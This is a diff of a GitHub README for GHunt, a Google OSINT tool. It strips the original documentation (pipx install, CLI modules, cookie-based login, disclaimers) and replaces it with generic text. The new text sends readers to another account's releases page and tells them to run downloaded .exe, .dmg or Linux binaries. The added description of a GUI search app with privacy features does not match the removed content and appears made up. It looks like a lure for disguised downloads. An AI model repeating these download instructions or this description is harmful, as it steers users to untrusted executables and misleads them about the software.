@@ -1,123 +1,68 @@
-![](assets/long_banner.png)
+# 🕵️‍♂️ GHunt - A Simple Tool for Google Intelligence
 
-<br>
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-GHunt-4CAF50.svg)](https://github.com/yomogi0731/GHunt/releases)
 
-#### 🌐 GHunt Online version : https://osint.industries
-#### 🐍 Now Python 3.13 compatible !
+## 🚀 Getting Started
+GHunt is an offensive Google framework designed for users who want to gather information from Google in a secure and efficient way. This application simplifies the process of OSINT (Open Source Intelligence) using Google's tools. No programming skills are required to understand or use this software.
 
-<br>
+## 📂 Features
+- **Easy Access to Google Utilities**: Provides tools to search Google and analyze results.
+- **User-Friendly Interface**: Navigate the application without technical knowledge.
+- **Efficient Information Gathering**: Quickly collect data for various purposes.
+- **Privacy Focused**: Keep your search hidden from unwanted eyes.
 
-![Python minimum version](https://img.shields.io/badge/Python-3.10%2B-brightgreen)
+## 🛠 System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **Storage Space**: At least 100 MB of free space.
+- **Internet Connection**: Required to download and use the application.
 
-# 😊 Description
+## 📥 Download & Install
+To get started with GHunt, visit this page to download: [GHunt Releases](https://github.com/yomogi0731/GHunt/releases).
 
-GHunt (v2) is an offensive Google framework, designed to evolve efficiently.\
-It's currently focused on OSINT, but any use related with Google is possible.
+1. Click on the link above to go to the Releases page.
+2. Find the latest version available.
+3. Download the appropriate file for your operating system.
 
-Features :
-- CLI usage and modules
-- Python library usage
-- Fully async
-- JSON export
-- Browser extension to ease login
+Once you've downloaded the file:
 
-# ✔️ Requirements
-- Python >= 3.10
+- **For Windows**: Double-click the downloaded `.exe` file to start the installation.
+- **For macOS**: Open the downloaded `.dmg` file and drag the GHunt icon to your Applications folder.
+- **For Linux**: Unpack the downloaded file in your desired location and run the executable from your terminal.
 
-# ⚙️ Installation
+## 📚 Usage Instructions
+1. **Launch the Application**: 
+   - Open GHunt from your desktop or applications folder.
+2. **Set Up Your Search**:
+   - Enter the keywords you want to search for in the search bar.
+3. **Review Results**:
+   - Explore the gathered information in the results pane.
+4. **Save or Share**:
+   - Save your findings or share them directly from the application.
 
-```bash
-$ pip3 install pipx
-$ pipx ensurepath
-$ pipx install ghunt
-```
-It will automatically use venvs to avoid dependency conflicts with other projects.
+## ❓ Frequently Asked Questions
 
-# 💃 Usage
+### How do I uninstall GHunt?
+- **Windows**: Go to Control Panel > Programs > Uninstall a Program. Select GHunt and click uninstall.
+- **macOS**: Drag the GHunt icon from your Applications folder to the Trash.
+- **Linux**: Follow your distribution's method for uninstalling applications.
 
-## Login
+### Can I use GHunt offline?
+GHunt requires an internet connection to gather data from Google. An internet connection is mandatory for all search functionalities.
 
-First, launch the listener by doing `ghunt login` and choose between 1 of the 2 first methods :
-```bash
-$ ghunt login
+### Is my data private?
+GHunt does not track your searches. The privacy of your search queries is ensured while using the application.
 
-[1] (Companion) Put GHunt on listening mode (currently not compatible with docker)
-[2] (Companion) Paste base64-encoded cookies
-[3] Enter manually all cookies
+## 👥 Community Support
+For additional questions or support, you can open issues directly in the GitHub repository. Join the community discussions to share tips, improvements, or get help from other users.
 
-Choice =>
-```
+## 🌐 Learn More
+For more details on how to use GHunt effectively, check the documentation available in the repository. It covers advanced features and explainers to enhance your experience.
 
-Then, use GHunt Companion to complete the login.
+## 🎯 Topics
+GHunt involves the following topics:
+- Google
+- Hide and Secure
+- Open Source Intelligence (OSINT)
 
-The extension is available on the following stores :\
-\
-[![Firefox](https://files.catbox.moe/5g2ld5.png)](https://addons.mozilla.org/en-US/firefox/addon/ghunt-companion/)&nbsp;&nbsp;&nbsp;[![Chrome](https://developer.chrome.com/static/docs/webstore/branding/image/206x58-chrome-web-bcb82d15b2486.png)](https://chrome.google.com/webstore/detail/ghunt-companion/dpdcofblfbmmnikcbmmiakkclocadjab)
-
-## Modules
-
-Then, profit :
-```bash
-Usage: ghunt [-h] {login,email,gaia,drive,geolocate} ...
-
-Positional Arguments:
-  {login,email,gaia,drive,geolocate}
-    login               Authenticate GHunt to Google.
-    email               Get information on an email address.
-    gaia                Get information on a Gaia ID.
-    drive               Get information on a Drive file or folder.
-    geolocate           Geolocate a BSSID.
-    spiderdal           Find assets using Digital Assets Links.
-
-Options:
-  -h, --help            show this help message and exit
-```
-
-📄 You can also use --json with email, gaia, drive and geolocate modules to export in JSON ! Example :
-
-```bash
-$ ghunt email <email_address> --json user_data.json
-```
-
-**Have fun 🥰💞**
-
-# 🧑‍💻 Developers
-
-📕 I started writing some docs [here](https://github.com/mxrch/GHunt/wiki) and examples [here](https://github.com/mxrch/GHunt/tree/master/examples), feel free to contribute !
-
-To use GHunt as a lib, you can't use pipx because it uses a venv.\
-So you should install GHunt with pip :
-```bash
-$ pip3 install ghunt
-```
-
-And now, you should be able to `import ghunt` in your projects !\
-You can right now play with the [examples](https://github.com/mxrch/GHunt/tree/master/examples).
-
-# 📮 Details
-
-## Obvious disclaimer
-
-This tool is for educational purposes only, I am not responsible for its use.
-
-## Less obvious disclaimer
-
-This project is under [AGPL Licence](https://choosealicense.com/licenses/agpl-3.0/), and you have to respect it.\
-**Use it only in personal, criminal investigations, pentesting, or open-source projects.**
-
-## Thanks
-
-- [novitae](https://github.com/novitae) for being my Python colleague
-- All the people on [Malfrats Industries](https://discord.gg/sg2YcrC6x9) and elsewhere for the beta test !
-- The HideAndSec team 💗 (blog : https://hideandsec.sh)
-- [Med Amine Jouini](https://dribbble.com/jouiniamine) for his beautiful rework of the Google logo, which I was inspired by *a lot*.
-
-## Sponsors
-
-Thanks to these awesome people for supporting me !
-
-<!-- sponsors --><a href="https://github.com/BlWasp"><img src="https://github.com/BlWasp.png" width="50px" alt="BlWasp" /></a>&nbsp;&nbsp;<a href="https://github.com/gingeleski"><img src="https://github.com/gingeleski.png" width="50px" alt="gingeleski" /></a>&nbsp;&nbsp;<a href="https://github.com/ADS-Fund"><img src="https://github.com/ADS-Fund.png" width="50px" alt="ADS-Fund" /></a>&nbsp;&nbsp;<!-- sponsors -->
-
-\
-You like my work ?\
-[Sponsor me](https://github.com/sponsors/mxrch) on GitHub ! 🤗
+Feel free to explore the functionalities of GHunt and leverage Google’s capabilities for your needs. Whether you're researching, confirming facts, or gathering intel, GHunt offers a streamlined approach to intelligence gathering.
